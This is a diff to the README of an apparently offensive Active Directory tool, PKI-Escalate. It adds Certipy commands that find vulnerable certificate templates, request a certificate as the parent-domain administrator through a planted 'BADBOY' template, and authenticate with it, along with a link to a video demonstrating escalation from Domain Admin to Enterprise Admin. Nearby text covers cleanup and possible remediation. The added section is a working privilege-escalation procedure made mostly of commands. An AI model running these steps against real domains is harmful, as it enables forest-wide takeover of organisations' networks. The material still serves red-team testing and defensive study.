@@ -52,6 +52,27 @@ To remove a template that was installed using the exploit:
 Clear-Template -TemplateName BADBOY -CAName NewCA
 ```
 
+Once exploited, consider using either Certipy or Certify to abuse the new template:
+```bash
+# Check the vulnerable templates - If LDAPs is properly configured then the scheme is not necessary
+certipy find -vulnerable -scheme ldap -u ganon -p Password1 -dc-ip 192.168.55.25
+
+# Request a certificate as the administrator user in the parent domain
+certipy req -username ganon@chasm.dc01.hyrule.local -ca 'HYRULE-CA' -target HYRULE-ADCS.HYRULE.LOCAL -template BADBOY -upn administrator@HYRULE.LOCAL  -password Password1 -debug
+
+# Authenticate to the parent domain as the administrator
+certipy auth -pfx administrator.pfx -dc-ip 192.168.55.5
+```
+
+Please consider clicking on the image below to watch a demonstration video:
+
+[![PKI-Escalate Demonstration - Domain Admin to Enterprise Admin](https://img.youtube.com/vi/XtwKvZ-kZRE/0.jpg)](http://www.youtube.com/watch?v=XtwKvZ-kZRE "PKI-Escalate Demonstration - Domain Admin to Enterprise Admin")
+
+Alternatively, a direct link is:
+
+https://www.youtube.com/watch?v=XtwKvZ-kZRE
+
+
 ## OPSEC Considerations
 
 In terms of remediation, I don't have much information on this attack as I believe this functionality is inherent to the way ADCS works within a forest environment. That is to say, replication up and down is a necessity to allow CA functionality across domains. However, removing full control from the SYSTEM user, or disabling inheritance on the `CN=CAName,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=DomainName,DC=Tld` container may stop a TA from being able to enable the certificate. 
